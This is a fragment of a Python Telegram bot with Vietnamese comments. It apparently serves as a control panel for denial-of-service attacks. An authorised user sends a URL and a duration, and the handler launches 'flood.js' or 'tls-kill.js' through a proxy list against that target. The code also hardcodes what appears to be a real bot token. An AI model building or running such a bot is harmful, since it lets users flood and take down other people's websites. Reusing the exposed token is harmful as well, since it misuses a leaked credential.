...
ALLOWED_CHAT_ID = -4524928920  # Thay thế bằng ID nhóm của bạn

# ID của người dùng được phép tấn công không giới hạn
ALLOWED_USER_ID = 6365140337  # Thay thế bằng ID người dùng của bạn

# Token của bạn
token_input = '7693836903:AAFo0Sft0TXcdc91uK4Byy7NErgoFAEq3Zk'
...
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        command = f"node flood.js {url} {time} 5 5 proxy.txt" if "/bypass" in update.message.text else f"node tls-kill.js {url} {time} 5 5 proxy.txt"
